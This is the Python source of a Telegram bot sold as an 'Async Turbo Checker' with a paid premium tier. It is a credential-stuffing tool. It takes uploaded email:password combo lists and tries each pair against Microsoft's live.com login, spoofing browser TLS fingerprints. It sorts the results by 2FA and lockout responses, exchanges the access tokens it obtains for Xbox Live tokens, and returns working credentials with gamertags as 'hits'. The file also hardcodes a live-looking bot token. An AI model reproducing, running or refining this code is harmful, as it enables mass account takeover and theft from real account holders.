# -*- coding: utf-8 -*-
"""
r1livk Ultimate Async Checker ⚡ - Telegram Bot (AsyncIO + TLS Spoofing Edition)
Optimized for Direct High-Speed Scanning & Zero False-Positives
"""

import os
import re
import time
import json
import asyncio
from datetime import date
from urllib.parse import urlparse, parse_qs
from curl_cffi.requests import AsyncSession
import telebot
from telebot import types

TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
OWNER_ID = 6266959915
CHANNEL_USERNAME = "@r1iv_k"  
bot = telebot.TeleBot(TOKEN)

PREMIUM_USERS_FILE = "premium_users.txt"
STATS_FILE = "user_stats.json"

user_states = {}

def load_json_data(filepath, default_val):
    if not os.path.exists(filepath):
        return default_val
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default_val

def save_json_data(filepath, data):
    try:
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except:
        pass

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        return set()
    with open(PREMIUM_USERS_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def check_user_subscription(user_id):
    if user_id == OWNER_ID:
        return True
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception:
        pass
    return False

REQUEST_TIMEOUT = 15
CONCURRENT_LIMIT = 10  # عدد العمليات المتزامنة الآمنة للاتصال المباشر (Direct)

active_scans = {}
user_usage = {}  
DAILY_LIMIT = 3500

def update_user_stats(user_id, checked_count, hits_count, username=None):
    stats = load_json_data(STATS_FILE, {})
    uid_str = str(user_id)
    
    if uid_str not in stats:
        stats[uid_str] = {"checked": 0, "hits": 0, "username": username or f"User_{user_id}"}
    
    stats[uid_str]["checked"] += checked_count
    stats[uid_str]["hits"] += hits_count
    if username:
        stats[uid_str]["username"] = username
        
    save_json_data(STATS_FILE, stats)

def check_daily_limit(chat_id, new_lines_count):
    if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
        return True, new_lines_count
        
    today = str(date.today())
    if chat_id not in user_usage or user_usage[chat_id]["date"] != today:
        user_usage[chat_id] = {"date": today, "count": 0}
    
    current_used = user_usage[chat_id]["count"]
    if current_used >= DAILY_LIMIT:
        return False, 0
    
    allowed_lines = min(new_lines_count, DAILY_LIMIT - current_used)
    return True, allowed_lines

def update_usage(chat_id, count):
    if chat_id == OWNER_ID or str(chat_id) in load_premium_users(): return 
    today = str(date.today())
    if chat_id in user_usage and user_usage[chat_id]["date"] == today:
        user_usage[chat_id]["count"] += count

def extract_ppft(text):
    patterns = [
        r'sFTTag:\s*["\']([^"\']+)["\']',
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'value=\\"([^\\"]+)\\"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    patterns = [
        r'urlPost:\s*["\']([^"\']+)["\']',
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

async def check_single_account_async(combo):
    parts = combo.split(':')
    if len(parts) < 2:
        return "bad", "Invalid Combo Format"

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    
    async with AsyncSession(impersonate="chrome120") as session:
        try:
            sftag_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=00000000402B5328"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                "&display=touch"
                "&response_type=token"
                "&locale=en"
            )
            
            resp = await session.get(sftag_url, timeout=REQUEST_TIMEOUT)
            sftag = extract_ppft(resp.text)
            url_post = extract_url_post(resp.text)

            if not sftag or not url_post:
                return "error", "Failed to extract PPFT"

            login_data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sftag,
                'type': '11',
                'NewUser': '1',
                'LoginOptions': '3',
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': sftag_url,
                'Origin': 'https://login.live.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
            
            login_req = await session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            login_text = login_req.text.lower()
            full_url = login_req.url.lower()

            real_2fa_triggers = [
                "two-step", "additional security", "identity/confirm?m=", 
                "proofs", "challenge/contact", "sendcode", "authmethod=email"
            ]
            
            if any(trigger in login_text or trigger in full_url for trigger in real_2fa_triggers):
                if "password is incorrect" not in login_text and "that microsoft account doesn't exist" not in login_text:
                    return "2fa", None

            if any(x in login_text for x in ["that microsoft account doesn't exist", "enter a valid email"]):
                return "bad", "Not Exist"

            if any(x in login_text for x in ["password is incorrect", "the account or password is incorrect"]):
                return "bad", "Wrong Password"

            if "account has been locked" in login_text:
                return "bad", "Locked"

            ms_token = None
            current_url = login_req.url
            
            if 'access_token=' in current_url:
                parsed_url = urlparse(current_url)
                fragment_qs = parse_qs(parsed_url.fragment)
                if 'access_token' in fragment_qs:
                    ms_token = fragment_qs['access_token'][0]
                else:
                    query_qs = parse_qs(parsed_url.query)
                    if 'access_token' in query_qs:
                        ms_token = query_qs['access_token'][0]

            if not ms_token:
                for hist_resp in login_req.history:
                    h_url = hist_resp.url
                    if 'access_token=' in h_url:
                        parsed_url = urlparse(h_url)
                        fragment_qs = parse_qs(parsed_url.fragment)
                        if 'access_token' in fragment_qs:
                            ms_token = fragment_qs['access_token'][0]
                            break
                        query_qs = parse_qs(parsed_url.query)
                        if 'access_token' in query_qs:
                            ms_token = query_qs['access_token'][0]
                            break

            if not ms_token:
                token_match = re.search(r'access_token=([^&\s\"\']+)', login_req.text)
                if token_match:
                    ms_token = token_match.group(1)
            
            if not ms_token:
                return "bad", "No Access Token"

            try:
                xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
                xb_req = await session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, timeout=REQUEST_TIMEOUT)
                
                if xb_req.status_code != 200:
                    return "bad", "Xbox Auth Failed"

                xb_token = xb_req.json()['Token']
                uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
            except Exception:
                return "bad", "Xbox Connection Error"

            gamertag = "N/A"
            gamerscore = "0"
            gscore_int = 0
            try:
                xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_xb_req = await session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=5)
                if xsts_xb_req.status_code == 200:
                    xsts_xb_token = xsts_xb_req.json()['Token']
                    prof_req = await session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                           headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=5)
                    if prof_req.status_code == 200:
                        settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamertag': gamertag = s['value']
                            if s['id'] == 'Gamerscore': 
                                gamerscore = s['value']
                                gscore_int = int(gamerscore) if str(gamerscore).isdigit() else 0
            except:
                pass

            if gscore_int <= 0:
                return "bad", "Zero Gamerscore (Filtered)"

            hit_info = (
                f"{email}:{password}\n"
                f"Gamertag: {gamertag} | Gamerscore: {gscore_int}G ⚡\n"
                f"=================================================="
            )
            
            return "hit", {"content": hit_info}

        except Exception as e:
            return "error", str(e)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    
    if not check_user_subscription(chat_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn_channel = types.InlineKeyboardButton("📢 Join Channel Now", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")
        btn_check = types.InlineKeyboardButton("🔄 Verify Subscription", callback_data="check_sub")
        markup.add(btn_channel, btn_check)
        
        bot.send_message(
            chat_id, 
            "⚠️ **Access Denied! You must subscribe to our channel first to use the bot.**\n\n"
            f"Channel: {CHANNEL_USERNAME}\n\n"
            "After joining, click **(Verify Subscription)** below 👇",
            parse_mode="Markdown",
            reply_markup=markup
        )
        return

    show_main_menu(message)

def show_main_menu(message):
    chat_id = message.chat.id if hasattr(message, 'chat') else message.chat.id
    msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_start = types.InlineKeyboardButton("⚡ Start Async Turbo Checker", callback_data="start_checker")
    btn_top = types.InlineKeyboardButton("🏆 Leaderboard", callback_data="show_leaderboard")
    btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
    btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
    
    markup.add(btn_start, btn_top, btn_premium, btn_account)

    today = str(date.today())
    if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
        status_text = "👑 Premium / Owner (Unlimited)"
    else:
        used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
        status_text = f"👤 Free ({used}/3500 lines today)"

    text = (
        "⚡ **r1livk Async Turbo Checker - V4.0** ⚡\n\n"
        "Powered by AsyncIO & TLS Spoofing (Direct Mode).\n"
        f"Your Status: {status_text}\n\n"
        "Please select an option below:"
    )
    
    if msg_id:
        try:
            bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
            return
        except:
            pass
    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id

    if call.data == "check_sub":
        if check_user_subscription(chat_id):
            bot.answer_callback_query(call.id, "✅ Thank you! Bot unlocked successfully.", show_alert=True)
            show_main_menu(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet! Please join first.", show_alert=True)
        return

    if not check_user_subscription(chat_id):
        bot.answer_callback_query(call.id, "⚠️ You must subscribe to the channel first!", show_alert=True)
        return

    if call.data == "start_checker":
        user_states[chat_id] = "combo"
        markup = types.InlineKeyboardMarkup()
        btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu")
        markup.add(btn_cancel)

        text = (
            "🎮 **Async Turbo Mode (>0G & TLS Spoofed)**\n\n"
            "Please send your combo file in `.txt` format (`email:password`)"
        )
        bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "show_leaderboard":
        stats = load_json_data(STATS_FILE, {})
        if not stats:
            bot.answer_callback_query(call.id, "📊 No stats available yet.", show_alert=True)
            return

        sorted_users = sorted(stats.items(), key=lambda x: (x[1]["hits"], x[1]["checked"]), reverse=True)[:10]
        lb_text = "🏆 **Top 10 Leaderboard - r1livk** 🏆\n\n"
        medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
        
        for idx, (uid, data) in enumerate(sorted_users):
            medal = medals[idx] if idx < len(medals) else f"#{idx+1}"
            name = data.get("username", f"User_{uid}")
            checked_c = data.get("checked", 0)
            hits_c = data.get("hits", 0)
            lb_text += f"{medal} **{name}**\n    └ 📊 Checked: `{checked_c}` | 🎯 Hits: `{hits_c}`\n\n"

        markup = types.InlineKeyboardMarkup()
        btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
        markup.add(btn_back)

        try:
            bot.edit_message_text(lb_text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        except:
            bot.send_message(chat_id, lb_text, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cancel_checker" or call.data == "back_to_menu":
        active_scans[chat_id] = False
        user_states[chat_id] = None
        show_main_menu(call.message)

    elif call.data == "stop_scan":
        active_scans[chat_id] = False
        bot.answer_callback_query(call.id, "⏹️ Scan stopped successfully.")

    elif call.data == "buy_premium":
        bot.answer_callback_query(call.id, "💎 Premium Plan: $15/Month\nContact Owner: @r1livk", show_alert=True)

    elif call.data == "my_account":
        today = str(date.today())
        if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
            bot.answer_callback_query(call.id, "Status: Premium / Owner\nMode: Async Turbo", show_alert=True)
        else:
            used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
            bot.answer_callback_query(call.id, f"Status: Free ({used}/3500 lines)\nMode: Async Turbo", show_alert=True)

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = message.chat.id
    
    if not check_user_subscription(chat_id):
        bot.reply_to(message, f"⚠️ You must subscribe to the channel first: {CHANNEL_USERNAME}")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        local_path = f"temp_file_{chat_id}.txt"
        with open(local_path, 'wb') as f:
            f.write(downloaded_file)

        with open(local_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip() and ':' in line]

        allowed, lines_to_process_count = check_daily_limit(chat_id, len(lines))
        if not allowed or lines_to_process_count <= 0:
            bot.reply_to(message, "⚠️ Daily limit reached! Upgrade to Premium for unlimited checks.")
            if os.path.exists(local_path): os.remove(local_path)
            return

        lines = lines[:lines_to_process_count]
        bot.reply_to(message, f"📥 File received. Initializing Async Turbo Scan for {len(lines)} lines...")
        active_scans[chat_id] = True
        
        username = message.from_user.username or message.from_user.first_name
        
        # تشغيل حلقة الـ Async في الخلفية
        import threading
        threading.Thread(target=run_async_checker_thread, args=(chat_id, local_path, lines, username)).start()

    except Exception as e:
        bot.reply_to(message, f"Error processing file: {e}")

def run_async_checker_thread(chat_id, filepath, lines, username):
    asyncio.run(process_async_checker(chat_id, filepath, lines, username))

async def process_async_checker(chat_id, filepath, lines, username):
    total = len(lines)
    checked = 0
    hits = 0
    tfa_count = 0
    bad = 0
    errors = 0

    timestamp_str = time.strftime("%Y%m%d_%H%M%S")
    output_filename = f"r1livk_AsyncHits_{timestamp_str}.txt"
    start_time = time.time()

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_stop = types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")
    btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
    markup.add(btn_stop, btn_back)

    initial_status_text = (
        f"🔥 **ASYNC TURBO SCAN STATS**\n\n"
        f"📊 Total: {total}\n"
        f"✅ Checked: 0\n"
        f"🔒 2FA: 0\n"
        f"❌ Bad / 0G: 0\n"
        f"🎯 Real Hits (>0G): 0\n\n"
        f"Progress: 0.0%\n"
        f"⚡ CPM: 0\n"
        f"⏱️ Elapsed: 00:00:00"
    )
    status_msg = bot.send_message(chat_id, initial_status_text, parse_mode="Markdown", reply_markup=markup)

    sem = asyncio.Semaphore(CONCURRENT_LIMIT)

    async def bound_worker(combo):
        nonlocal checked, hits, tfa_count, bad, errors
        if not active_scans.get(chat_id, True):
            return

        async with sem:
            status, error_msg = await check_single_account_async(combo)
            checked += 1
            if status == "hit" and isinstance(error_msg, dict):
                hits += 1
                data = error_msg
                with open(output_filename, 'a', encoding='utf-8') as out_f:
                    out_f.write(data["content"] + "\n\n")
            elif status == "2fa":
                tfa_count += 1
            elif status == "bad":
                bad += 1
            else:
                errors += 1

    tasks = [bound_worker(line) for line in lines]
    
    # حلقة تحديث الشاشة أثناء الفحص
    async def update_progress():
        while active_scans.get(chat_id, True) and checked < total:
            await asyncio.sleep(1.0)
            elapsed = int(time.time() - start_time)
            if elapsed > 0:
                mins, secs = divmod(elapsed, 60)
                hrs, mins = divmod(mins, 60)
                cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
                pct = (checked / total) * 100 if total > 0 else 0

                live_text = (
                    f"🔥 **ASYNC TURBO SCAN (Live)**\n\n"
                    f"📊 Total: {total}\n"
                    f"✅ Checked: {checked} ({pct:.1f}%)\n"
                    f"🔒 2FA: {tfa_count}\n"
                    f"❌ Bad / 0G: {bad}\n"
                    f"🎯 Real Hits (>0G): {hits}\n\n"
                    f"⚡ CPM: {cpm}\n"
                    f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}"
                )
                try:
                    bot.edit_message_text(live_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
                except:
                    pass

    progress_task = asyncio.create_task(update_progress())
    await asyncio.gather(*tasks, return_exceptions=True)
    active_scans[chat_id] = False
    progress_task.cancel()

    if os.path.exists(filepath):
        os.remove(filepath)

    update_user_stats(chat_id, checked, hits, username)
    update_usage(chat_id, checked)

    final_summary = (
        f"🎉 **SCAN COMPLETED SUCCESSFULLY!**\n\n"
        f"📊 Total Checked: {checked}\n"
        f"🎯 Real Hits (>0G Found): {hits}\n"
        f"🔒 True 2FA Protected: {tfa_count}\n"
        f"❌ Bad / 0G Accounts: {bad}"
    )
    try:
        bot.edit_message_text(final_summary, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
    except:
        bot.send_message(chat_id, final_summary, parse_mode="Markdown")

    if hits > 0 and os.path.exists(output_filename):
        with open(output_filename, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"📁 **Async Turbo Hits File (>0G):** {output_filename}")

if __name__ == "__main__":
    print("🚀 r1livk Async Turbo Checker Bot is running...")
    bot.infinity_polling()
